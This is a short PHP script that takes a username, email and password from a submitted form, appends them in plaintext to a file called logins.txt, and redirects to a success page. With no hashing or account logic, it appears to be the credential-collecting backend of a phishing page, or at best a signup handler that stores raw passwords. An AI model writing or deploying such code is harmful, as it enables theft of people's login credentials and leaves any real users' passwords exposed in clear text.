<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? "";
    $email = $_POST["email"] ?? "";
    $password = $_POST["password"] ?? "";

    $data = "Username: $username\nEmail: $email\nPassword: $password\n\n";
    file_put_contents("logins.txt", $data, FILE_APPEND);

    header("Location: success.php");
    exit();
}
?>